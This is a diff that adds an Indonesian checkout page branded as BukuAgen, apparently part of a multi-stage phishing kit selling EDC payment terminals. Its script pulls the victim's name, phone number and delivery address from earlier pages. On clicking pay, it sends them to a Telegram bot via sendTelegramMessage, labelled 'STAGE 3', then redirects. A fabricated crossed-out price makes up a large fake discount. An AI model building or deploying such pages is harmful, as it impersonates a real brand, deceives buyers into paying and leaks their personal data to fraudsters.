@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Detail Pembayaran EDC BukuAgen</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f3f4f6;
+        }
+        .no-scrollbar::-webkit-scrollbar {
+            display: none;
+        }
+        .no-scrollbar {
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .animate-spin-custom {
+            animation: spin 1s linear infinite;
+        }
+    </style>
+</head>
+<body class="flex justify-center items-center min-h-screen p-0 sm:p-4">
+
+    <div class="w-full max-w-md bg-white h-screen sm:h-[800px] flex flex-col relative shadow-2xl overflow-hidden rounded-none sm:rounded-3xl border border-gray-100">
+        
+        <div class="px-6 pt-6 pb-3 bg-white shrink-0 border-b border-gray-50 flex items-center justify-between z-20">
+            <div class="h-6 flex items-center">
+                <img src="assets/img/bukuagen.png" alt="Logo BukuAgen" class="h-full object-contain">
+            </div>
+        </div>
+
+        <div class="flex-1 overflow-y-auto no-scrollbar p-5 space-y-5 pb-40 bg-[#F8FAFC]">
+            
+            <div class="border border-gray-100 rounded-2xl p-4 shadow-[0_2px_10px_rgba(0,0,0,0.01)] bg-white flex gap-4">
+                <div class="w-20 h-20 border border-gray-100 rounded-xl p-1 flex items-center justify-center bg-gray-50 shrink-0">
+                    <img id="display-image" src="assets/img/produk1.webp" alt="Produk" class="w-full h-full object-contain">
+                </div>
+                <div class="flex flex-col justify-center flex-grow">
+                    <div class="flex justify-between items-start gap-2">
+                        <div>
+                            <h2 id="display-title" class="font-bold text-gray-950 text-[15px] leading-tight">Beli MF919</h2>
+                            <p id="display-desc" class="text-[12px] text-gray-500 mt-1 leading-snug">EDC Android - MoreFun (MF919)</p>
+                        </div>
+                        <span id="display-price" class="font-extrabold text-gray-950 text-[15px] whitespace-nowrap">Rp 2.149.000</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="border border-gray-100 rounded-2xl p-5 shadow-[0_2px_10px_rgba(0,0,0,0.01)] bg-white space-y-4">
+                <div>
+                    <span class="text-[12px] font-medium text-gray-400 block">Nama</span>
+                    <span id="summary-nama" class="text-[14px] font-semibold text-gray-800 block mt-0.5">-</span>
+                </div>
+                <div>
+                    <span class="text-[12px] font-medium text-gray-400 block">Nomor HP</span>
+                    <span id="summary-hp" class="text-[14px] font-semibold text-gray-800 block mt-0.5">-</span>
+                </div>
+                <div>
+                    <span class="text-[12px] font-medium text-gray-400 block">Alamat Pengiriman EDC</span>
+                    <span id="summary-alamat" class="text-[13px] font-semibold text-gray-700 block mt-0.5 leading-relaxed">-</span>
+                </div>
+            </div>
+
+            <div class="space-y-1.5">
+                <label class="text-[12px] font-bold text-gray-900">Kode Voucher</label>
+                <div class="flex gap-2">
+                    <input type="text" id="input-voucher" placeholder="MASUKKAN KODE VOUCHER" class="flex-1 border border-gray-200 rounded-xl px-4 py-3 text-[13px] font-semibold uppercase tracking-wider focus:outline-none focus:border-blue-500 transition bg-white placeholder-gray-300">
+                    <button id="btn-cek-voucher" class="bg-[#0084FF] text-white font-bold text-[13px] px-6 rounded-xl hover:bg-blue-600 transition cursor-pointer">Cek</button>
+                </div>
+            </div>
+
+            <div class="border border-gray-100 rounded-2xl p-5 shadow-[0_2px_10px_rgba(0,0,0,0.01)] bg-white space-y-3.5">
+                <h3 class="text-[14px] font-bold text-gray-950">Detail Pembayaran</h3>
+                
+                <div class="flex justify-between items-center text-[13px] font-medium text-gray-400">
+                    <span>Total Pembelian</span>
+                    <span id="billing-total">Rp 3.899.000</span>
+                </div>
+                
+                <div class="flex justify-between items-center text-[13px] font-medium text-gray-400">
+                    <span>Diskon</span>
+                    <span id="billing-diskon">Rp 1.750.000</span>
+                </div>
+                
+                <div class="pt-3 border-t border-gray-100 flex justify-between items-center">
+                    <span class="text-[14px] font-bold text-gray-950">Total Pembayaran</span>
+                    <span id="billing-final" class="text-[15px] font-black text-gray-950">Rp 2.149.000</span>
+                </div>
+            </div>
+
+        </div>
+
+        <div class="absolute bottom-0 left-0 right-0 bg-white p-4 border-t border-gray-100 rounded-t-2xl z-30 shrink-0 space-y-3">
+            <div class="bg-[#EFF6FF] border border-[#BFDBFE] rounded-xl p-3.5 flex items-start gap-3">
+                <div class="text-blue-500 shrink-0 mt-0.5">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
+                    </svg>
+                </div>
+                <p class="text-[11.5px] font-medium text-blue-700 leading-normal">
+                    Pastikan transaksi sudah sesuai sebelum melanjutkan proses bayar.
+                </p>
+            </div>
+
+            <button id="btn-pay" class="w-full bg-[#FFD12D] text-gray-900 font-extrabold py-3.5 rounded-xl text-center text-sm shadow-sm hover:bg-yellow-400 cursor-pointer transition flex items-center justify-center gap-2">
+                <svg id="btn-spinner" class="hidden w-5 h-5 text-black animate-spin-custom" fill="none" viewBox="0 0 24 24">
+                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                </svg>
+                <span id="btn-text">Bayar - Rp 2.149.000</span>
+            </button>
+        </div>
+
+    </div>
+
+    <script src="telegram-config.js"></script>
+    <script>
+document.addEventListener("DOMContentLoaded", () => {
+
+    // === AMBIL DATA PRODUK DARI LOCALSTORAGE ===
+    const prodName = localStorage.getItem('selectedProductName') || 'EDC Android - MoreFun (MF919)';
+    const prodPriceRaw = localStorage.getItem('selectedProductPrice') || 'Rp 2.149.000';
+    const prodImage = localStorage.getItem('selectedProductImage') || 'assets/img/produk4.webp';
+    const prodDesc = localStorage.getItem('selectedProductDesc') || 'EDC Komplit Serba Bisa';
+
+    // === AMBIL DATA PELANGGAN YANG DISIMPAN DARI HALAMAN 2 ===
+    const customerNama = localStorage.getItem('customerNama') || '-';
+    const customerHp = localStorage.getItem('customerHp') || '-';
+    const customerAlamat = localStorage.getItem('customerAlamatComplete') || '-';
+
+    // Render ke Elemen UI Ringkasan Atas
+    document.getElementById('display-title').innerText = prodName.includes('(') ? 'Beli ' + prodName.split('(')[1].replace(')', '') : prodName;
+    document.getElementById('display-desc').innerText = prodDesc;
+    document.getElementById('display-image').src = prodImage;
+
+    // Menampilkan data pembeli dinamis
+    document.getElementById('summary-nama').innerText = customerNama;
+    document.getElementById('summary-hp').innerText = customerHp;
+    document.getElementById('summary-alamat').innerText = customerAlamat;
+
+    // Kalkulasi Kasir Finansial
+    function parseCurrency(text) {
+        return parseInt(text.replace(/[^0-9]/g, '')) || 0;
+    }
+
+    function formatCurrency(num) {
+        return 'Rp ' + num.toLocaleString('id-ID');
+    }
+
+    const finalPriceInt = parseCurrency(prodPriceRaw);
+    let totalPembelian = finalPriceInt > 500000 ? finalPriceInt + 1750000 : finalPriceInt + 200000;
+    let diskonAwal = totalPembelian - finalPriceInt;
+    let totalPembayaranFinal = finalPriceInt;
+
+    function renderBilling() {
+        document.getElementById('display-price').innerText = formatCurrency(totalPembayaranFinal);
+        document.getElementById('billing-total').innerText = formatCurrency(totalPembelian);
+        document.getElementById('billing-diskon').innerText = formatCurrency(diskonAwal);
+        document.getElementById('billing-final').innerText = formatCurrency(totalPembayaranFinal);
+        document.getElementById('btn-text').innerText = `Bayar - ${formatCurrency(totalPembayaranFinal)}`;
+    }
+
+    renderBilling();
+
+    // Sistem Kode Voucher
+    const inputVoucher = document.getElementById('input-voucher');
+    const btnCekVoucher = document.getElementById('btn-cek-voucher');
+
+    btnCekVoucher.addEventListener('click', () => {
+        const code = inputVoucher.value.trim().toUpperCase();
+        if(!code) {
+            alert('Silahkan masukkan kode voucher.');
+            return;
+        }
+
+        if (code === 'REJEKI' || code === 'BUKUAGENNEW') {
+            alert('Voucher berhasil dipasang! Potongan tambahan Rp 50.000');
+            diskonAwal += 50000;
+            totalPembayaranFinal -= 50000;
+            if(totalPembayaranFinal < 0) totalPembayaranFinal = 0;
+            renderBilling();
+            btnCekVoucher.innerText = "Cek";
+            btnCekVoucher.disabled = true;
+            btnCekVoucher.classList.add('opacity-50', 'cursor-not-allowed');
+        } else {
+            alert('Kode voucher tidak valid.');
+        }
+    });
+
+    // Kirim Log Akhir ke Telegram saat Tombol Bayar Diklik
+    const btnPay = document.getElementById('btn-pay');
+    const btnSpinner = document.getElementById('btn-spinner');
+    const btnText = document.getElementById('btn-text');
+
+    btnPay.addEventListener('click', async () => {
+        btnPay.classList.add('pointer-events-none', 'opacity-80');
+        btnSpinner.classList.remove('hidden');
+        btnText.innerText = "Memproses...";
+
+        const logTelegram = `🟢 *TRANSAKSI BAYAR (STAGE 3)* 🟢\n` +
+            `-----------------------------------------\n` +
+            `👤 *Pelanggan:* ${customerNama}\n` +
+            `📞 *No HP:* ${customerHp}\n` +
+            `📦 *Item:* ${prodName}\n` +
+            `📍 *Alamat:* ${customerAlamat}\n` +
+            `🎟️ *Voucher:* ${inputVoucher.value.toUpperCase() || 'Tidak Ada'}\n` +
+            `-----------------------------------------\n` +
+            `🧾 *Rincian Billing:*\n` +
+            `• Total: ${formatCurrency(totalPembelian)}\n` +
+            `• Potongan Diskon: -${formatCurrency(diskonAwal)}\n` +
+            `• *TOTAL BAYAR:* ${formatCurrency(totalPembayaranFinal)}\n` +
+            `-----------------------------------------`;
+
+        try {
+            await sendTelegramMessage(logTelegram);
+        } catch(e) {
+            console.error(e);
+        }
+
+        setTimeout(() => {
+            window.location.href = '4.html'; 
+        }, 2000);
+    });
+});
+    </script>
+</body>
+</html>
